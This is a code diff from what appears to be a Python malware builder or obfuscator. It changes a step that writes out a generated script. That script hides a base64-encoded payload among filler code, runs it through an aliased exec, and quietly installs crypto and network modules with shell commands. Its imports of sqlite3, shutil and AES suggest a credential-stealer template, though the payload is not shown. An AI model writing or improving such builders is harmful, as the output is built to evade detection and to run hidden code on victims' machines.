@@ -182,11 +182,12 @@ decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
     name = args.name+'.py'
     s = base64.b64encode(obfuscated_code.encode('utf-8'))
     aw = random_class_name()
-    with open(f'{BUILD_PATH}/{name}', "wb") as obfu_file:
-        obfu_file.write(f'{all_fake_code}\nimport ctypes;import base64,subprocess,sqlite3,json,shutil\nimport time\nModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]\nfor module in ModuleRequirements:\n    try:\n       __import__(module[0])\n    except:      subprocess.Popen(executable+ " -m pip install " + module[1] + " --quiet", shell=True)\n         time.sleep(3)\nfrom Crypto.Cipher import AESfrom json import loads, dumps\nfrom urllib.request import Request, urlopen\ntry:import cryptography\nexcept:subprocess.run("python -m pip install cryptography")\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run("python -m pip install cryptography", shell=True)\ntry:import requests\nexcept:subprocess.run("python -m pip install requests", shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run("python -m pip install Crypto", shell=True)\nfrom cryptography.fernet import Fernet \n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\n{aw}="{s.decode("utf-8")}"\n{e}(base64.b64decode({aw}))\n{all_fake_code}').encode("utf-8")  
-    obfuscated_file_path = os.path.join(BUILD_PATH, f"{name}")
 
-    # Clean up
+    with open(f'{BUILD_PATH}/{name}', "w+") as obfu_file:
+        obfu_file.write(f'from sys import executable, stderr\n{all_fake_code}\nimport ctypes;import base64,subprocess,sqlite3,json,shutil\nimport time\nModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]\nfor module in ModuleRequirements:\n    try:\n       __import__(module[0])\n    except:      subprocess.Popen(executable+ " -m pip install " + module[1] + " --quiet", shell=True)\nfrom Crypto.Cipher import AES\nfrom json import loads, dumps\nfrom urllib.request import Request, urlopen\ntry:import cryptography\nexcept:subprocess.run("python -m pip install cryptography")\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run("python -m pip install cryptography", shell=True)\ntry:import requests\nexcept:subprocess.run("python -m pip install requests", shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run("python -m pip install Crypto", shell=True)\nfrom cryptography.fernet import Fernet \n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\n{aw}="{s.decode("utf-8")}"\n{e}(base64.b64decode({aw}))\n{all_fake_code}') 
+
+    obfuscated_file_path = os.path.join(BUILD_PATH, f"{name}")
+        # Clean up
     os.remove(ENCRYPTION_KEY_FILE)
     logging.info(f"The code has been encrypted, Filename: {obfuscated_file_path}")
 
